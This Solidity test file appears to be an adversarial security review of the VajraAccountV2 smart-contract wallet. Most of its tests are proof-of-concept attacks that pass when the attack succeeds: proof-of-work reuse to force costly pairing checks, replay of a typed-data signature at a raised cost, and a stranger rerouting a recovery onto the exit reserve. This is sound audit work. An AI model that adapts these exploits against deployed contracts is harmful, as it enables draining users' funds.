// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, stdJson} from "forge-std/Test.sol";
import {VajraAccountV2} from "../src/VajraAccountV2.sol";
import {VajraExit, VajraExitFactory} from "../src/VajraExit.sol";
import {RecoveryVerifier} from "../src/verifiers/RecoveryVerifier.sol";
import {ShieldVerifier} from "../src/verifiers/ShieldVerifier.sol";
import {Scope as VajraScope} from "@forshtat/hegota-support/contracts/Params.sol";

contract ReviewStakeSink {
    function addStake(uint32) external payable {}
}

contract ReviewApproveDouble {
    event Approved(uint256 scope);

    fallback() external {
        emit Approved(abi.decode(msg.data, (uint256)));
    }
}

/// Independent review. Each test passes when the attack it names WORKS, so a fix should turn these red.
/// The account, verifiers and proofs are real. The frame opcodes are answered by mocks, as in VajraAccountV2.t.sol.
contract AdversarialReviewTest is Test {
    using stdJson for string;

    uint256 constant DENOM = 0.1 ether;
    uint256 constant MAX_PROOF_COST = 0.005 ether;
    uint256 constant DAILY_CAP = 0.05 ether;
    uint256 constant CHAIN = 13370;
    uint256 constant WORK_BITS = 10; // packages/cli/src/deploy.ts on the mirror
    bytes32 constant SALT = 0xabababababababababababababababababababababababababababababababab;
    bytes32 constant NEW_ROOT = 0xcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcd;
    bytes32 constant TICKET = keccak256("the ticket on the paper");
    bytes32 constant GATE = keccak256(abi.encode(TICKET));
    bytes32 constant SPEND_TYPE = keccak256(
        "DailySpend(address asset,address recipient,uint256 amount,uint256 nonce,uint256 maxFeePerGas,uint256 maxPriorityFeePerGas,uint256 executionGas,uint256 stateGas)"
    );

    uint256 constant APPROVE = 1;
    uint256 constant TX_PARAM = 2;
    uint256 constant FRAME_DATA_LOAD = 3;
    uint256 constant FRAME_PARAM = 5;
    uint256 constant SIG_PARAM = 6;

    uint256 constant NONCE = 1;
    uint256 constant TX_SENDER = 2;
    uint256 constant MAX_PRIORITY = 3;
    uint256 constant MAX_FEE = 4;
    uint256 constant MAX_COST = 6;
    uint256 constant FRAME_COUNT = 9;
    uint256 constant CURRENT_FRAME = 10;
    uint256 constant NONCE_KEY_COUNT = 14;
    uint256 constant NONCE_KEY_0 = 16;
    uint256 constant RESOLVED_TARGET = 0;
    uint256 constant EXECUTION_GAS_LIMIT = 1;
    uint256 constant MODE = 2;
    uint256 constant DATA_LENGTH = 4;
    uint256 constant VALUE = 8;
    uint256 constant STATE_GAS_LIMIT = 9;

    event Approved(uint256 scope);

    VajraAccountV2 implementation;
    VajraAccountV2 account;
    address daily = makeAddr("daily");
    address payable harbor = payable(makeAddr("harbor"));

    uint256 commitment;
    uint256 nullifier;
    uint256[8] recoveryProof;
    uint256 firstNote;
    uint256 secondNote;
    uint256 nullifierHash;
    uint256[8] unshieldProof;

    function setUp() public {
        vm.warp(1_800_000_000);
        vm.chainId(CHAIN);
        string memory json = vm.readFile("test/vectors/zk.json");
        commitment = json.readUint(".commitment");
        nullifier = json.readUint(".nullifier");
        firstNote = json.readUint(".firstNote");
        secondNote = json.readUint(".secondNote");
        nullifierHash = json.readUint(".nullifierHash");
        uint256[] memory r = json.readUintArray(".recoveryProof");
        uint256[] memory u = json.readUintArray(".unshieldProof");
        for (uint256 i; i < 8; ++i) {
            recoveryProof[i] = r[i];
            unshieldProof[i] = u[i];
        }
        bytes memory poseidonCode = json.readBytes(".poseidon");
        address poseidon;
        assembly ("memory-safe") {
            poseidon := create(0, add(poseidonCode, 32), mload(poseidonCode))
        }
        implementation = new VajraAccountV2(
            4, 3, address(new ReviewStakeSink()), address(new RecoveryVerifier()), address(new ShieldVerifier()), poseidon, DENOM, MAX_PROOF_COST, WORK_BITS
        );
        vm.etch(helper(APPROVE), type(ReviewApproveDouble).runtimeCode);
        address at = json.readAddress(".account");
        vm.etch(at, abi.encodePacked(hex"363d3d373d3d3d363d73", address(implementation), hex"5af43d82803e903d91602b57fd5bf3"));
        account = VajraAccountV2(payable(at));

        address[] memory assets = new address[](1);
        uint128[] memory limits = new uint128[](1);
        limits[0] = 10 ether;
        uint128[] memory cooling = new uint128[](1);
        cooling[0] = 10 ether;
        account.initialize{value: 5 ether}(
            VajraAccountV2.Config({
                dailyKey: daily,
                wotsRoot: keccak256("first tree"),
                epochSalt: SALT,
                harborCommitment: keccak256(abi.encodePacked(address(harbor), keccak256("harbor salt"))),
                queueDelay: 1 days,
                coolingPeriod: 0,
                maxDailyTxCost: uint128(DAILY_CAP),
                assets: assets,
                dailyLimits: limits,
                coolingAllowances: cooling,
                coSigner: address(0),
                stake: 0,
                unstakeDelay: 0
            })
        );
    }

    function helper(uint256 nonce) private view returns (address) {
        return vm.computeCreateAddress(address(implementation), nonce);
    }

    function setTx(uint256 param, uint256 value) private {
        vm.mockCall(helper(TX_PARAM), abi.encode(param), abi.encode(value));
    }

    function setFrameAt(uint256 index, uint256 param, uint256 value) private {
        vm.mockCall(helper(FRAME_PARAM), abi.encode(index, param), abi.encode(value));
    }

    function setFrame(uint256 param, uint256 value) private {
        setFrameAt(1, param, value);
    }

    function setWord(uint256 offset, bytes32 word) private {
        vm.mockCall(helper(FRAME_DATA_LOAD), abi.encode(offset, uint256(1)), abi.encode(word));
    }

    function proofFrame(bytes4 selector, uint256 length, uint256 nonceKey, uint256 executionGas, uint256 stateGas) private {
        setFrame(EXECUTION_GAS_LIMIT, executionGas);
        setFrame(STATE_GAS_LIMIT, stateGas);
        setTx(CURRENT_FRAME, 0);
        setTx(FRAME_COUNT, 2);
        setTx(NONCE_KEY_COUNT, 1);
        setTx(NONCE_KEY_0, nonceKey);
        setTx(NONCE, 0);
        setTx(MAX_COST, 0.003 ether);
        setFrame(MODE, 2);
        setFrame(RESOLVED_TARGET, uint256(uint160(address(account))));
        setFrame(VALUE, 0);
        setFrame(DATA_LENGTH, length);
        setWord(0, bytes32(selector));
    }

    // ---------------------------------------------------------------- 1. proof of work --------------

    /// One solved `work` opens the pairing for any recipient and any known root: only the proof and nullifier are in its hash.
    /// The proof here does not verify for these recipients, so every call is junk that a node pays a pairing for.
    function test_attack_oneWorkBuysUnlimitedPairings() public {
        vm.prank(address(account));
        account.shield{value: DENOM}(firstNote);
        uint256 olderRoot = account.poolRoot();
        account.shield{value: DENOM}(secondNote);
        uint256 newerRoot = account.poolRoot();

        bytes32 key = keccak256(abi.encodePacked(keccak256("vajra.unshield.v1"), nullifierHash));
        uint256 work;
        while (uint256(keccak256(abi.encode(address(account), unshieldProof, key, work))) >> (256 - WORK_BITS) != 0) work++;

        proofFrame(account.unshield.selector, 100, uint256(key), 500_000, 600_000);
        setWord(36, bytes32(nullifierHash));
        uint256 reached;
        for (uint256 i = 1; i <= 40; ++i) {
            setWord(4, bytes32(i % 2 == 0 ? olderRoot : newerRoot));
            setWord(68, bytes32(i)); // a different transaction, a different hash, the same work
            uint256 before = gasleft();
            vm.expectRevert(VajraAccountV2.ShieldProofInvalid.selector);
            account.validateUnshield(unshieldProof, work);
            if (before - gasleft() > 100_000) reached++;
        }
        assertEq(reached, 40, "every copy reached the pairing on one work");
    }

    // ---------------------------------------------------------------- 2. what typed data leaves out ---

    function typedDigest(address to, uint256 amount) private view returns (bytes32) {
        bytes32 domain = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256("VAJRA"),
                keccak256("2"),
                CHAIN,
                address(account)
            )
        );
        bytes32 structHash = keccak256(
            abi.encode(SPEND_TYPE, address(0), to, amount, uint256(5), uint256(2 gwei), uint256(1 gwei), uint256(500_000), uint256(700_000))
        );
        return keccak256(abi.encodePacked("\x19\x01", domain, structHash));
    }

    function walletFrame(bytes32 signed, address to, uint256 amount, uint256 maxCost) private {
        vm.mockCall(helper(SIG_PARAM), abi.encode(uint256(0), uint256(0)), abi.encode(uint256(uint160(daily))));
        vm.mockCall(helper(SIG_PARAM), abi.encode(uint256(0), uint256(2)), abi.encode(signed));
        setTx(TX_SENDER, uint256(uint160(address(account))));
        setTx(NONCE_KEY_COUNT, 1);
        setTx(NONCE_KEY_0, 0);
        setTx(MAX_COST, maxCost);
        setTx(CURRENT_FRAME, 0);
        setTx(FRAME_COUNT, 2);
        setTx(NONCE, 5);
        setTx(MAX_FEE, 2 gwei);
        setTx(MAX_PRIORITY, 1 gwei);
        setFrame(MODE, 2);
        setFrame(RESOLVED_TARGET, uint256(uint160(address(account))));
        setFrame(VALUE, 0);
        setFrame(DATA_LENGTH, 100);
        setFrame(EXECUTION_GAS_LIMIT, 500_000);
        setFrame(STATE_GAS_LIMIT, 700_000);
        setWord(0, bytes32(account.spend.selector));
        setWord(4, bytes32(0));
        setWord(36, bytes32(uint256(uint160(to))));
        setWord(68, bytes32(amount));
    }

    /// A wallet signs the typed digest, not the signature hash. Frame 0's limit and data, and any extra signature entry, are in no
    /// field, so a stranger's copy with a padded VERIFY frame costs the account up to the daily cap, under the same signature.
    function test_attack_typedCopyRaisesTheCostToTheCap() public {
        address to = makeAddr("payee");
        bytes32 signed = typedDigest(to, 1 ether);
        uint256 honestCost = (20_000 + 60_000 + 500_000 + 700_000) * uint256(2 gwei);

        walletFrame(signed, to, 1 ether, honestCost);
        vm.expectEmit(address(account));
        emit Approved(3);
        account.validateDaily(VajraScope.EXECUTION_AND_PAYMENT);

        // The stranger's copy: nothing re-signed, and the digest does not move.
        setFrameAt(0, DATA_LENGTH, 120_000);
        setFrameAt(0, EXECUTION_GAS_LIMIT, 90_000);
        setTx(MAX_COST, DAILY_CAP);
        vm.expectEmit(address(account));
        emit Approved(3);
        account.validateDaily(VajraScope.EXECUTION_AND_PAYMENT);
        assertGt(DAILY_CAP, honestCost * 19);
    }

    /// APPROVE takes MAX_COST from the balance and refunds only at the end of the transaction. So the raised cost is missing while
    /// the SENDER frame runs, and a spend that fits under the signed cost reverts under the copy's: nonce and fee gone, nobody paid.
    /// That is the outcome FINDINGS section 15 says a copy can no longer cause.
    function test_attack_typedCopyMakesTheSenderFrameFail() public {
        address to = makeAddr("payee");
        uint256 honestCost = 0.003 ether;
        uint256 amount = 4.99 ether;
        bytes32 signed = typedDigest(to, amount);

        // Honest: VERIFY passes, the balance is debited the signed cost, and the spend goes through.
        uint256 snap = vm.snapshotState();
        walletFrame(signed, to, amount, honestCost);
        account.validateDaily(VajraScope.EXECUTION_AND_PAYMENT);
        vm.deal(address(account), 5 ether - honestCost);
        vm.prank(address(account));
        account.spend(address(0), to, amount);
        assertEq(to.balance, amount);
        vm.revertToState(snap);

        // The copy: same signature, same digest, VERIFY passes. Only MAX_COST changed.
        walletFrame(signed, to, amount, DAILY_CAP);
        account.validateDaily(VajraScope.EXECUTION_AND_PAYMENT);
        vm.deal(address(account), 5 ether - DAILY_CAP);
        vm.prank(address(account));
        vm.expectRevert(VajraAccountV2.ValueNotConserved.selector);
        account.spend(address(0), to, amount);
        assertEq(to.balance, 0);
    }

    // ---------------------------------------------------------------- 3. the exit's reserve ---------

    /// A recovery sent from the account is public. A stranger resends its proof and ticket from the exit, and the reserve pays, with no
    /// key and no secret. Nonce keys are per sender, so nothing ties the two.
    function test_attack_strangerReroutesARecoveryOntoTheReserve() public {
        VajraExit exitImplementation = new VajraExit(4, 3, account.STAKING_REGISTRY());
        VajraExitFactory factory = new VajraExitFactory(address(exitImplementation));
        VajraExit exit = VajraExit(payable(factory.create{value: 0.006 ether}(address(account), keccak256("exit tree"), SALT, 0, 0)));
        vm.etch(vm.computeCreateAddress(address(exitImplementation), APPROVE), type(ReviewApproveDouble).runtimeCode);
        vm.mockCall(
            vm.computeCreateAddress(address(exitImplementation), TX_PARAM), abi.encode(TX_SENDER), abi.encode(uint256(uint160(address(exit))))
        );

        vm.startPrank(address(account));
        account.setExit(address(exit));
        account.setRecovery(commitment, 2 days, GATE);
        vm.stopPrank();

        uint256 key = uint256(keccak256(abi.encodePacked(keccak256("vajra.recovery.v1"), nullifier, NEW_ROOT)));
        proofFrame(account.queueRecovery.selector, 68, key, 200_000, 800_000);
        setWord(4, NEW_ROOT);
        setWord(36, bytes32(nullifier));
        setTx(MAX_COST, MAX_PROOF_COST);

        vm.expectEmit(address(exit));
        emit Approved(3);
        exit.validateRecovery(recoveryProof, TICKET);
    }

    // ---------------------------------------------------------------- 4. sponsorship on V2 ---------

    /// `[only_verify, charge, pay, SENDER, settle]` has a DEFAULT frame after the daily VERIFY, and V2's walk refuses those. So no daily
    /// transaction on V2 can be sponsored. `paymaster-e2e` runs on V1, where the walk skips them.
    function test_finding_v2DailyCannotBeSponsored() public {
        walletFrame(bytes32(0), address(0), 0, 0);
        setTx(FRAME_COUNT, 5);
        setFrameAt(1, MODE, 0);
        vm.expectRevert(abi.encodeWithSelector(VajraAccountV2.FrameNotAllowed.selector, uint256(1)));
        account.validateDaily(VajraScope.EXECUTION);
    }
}
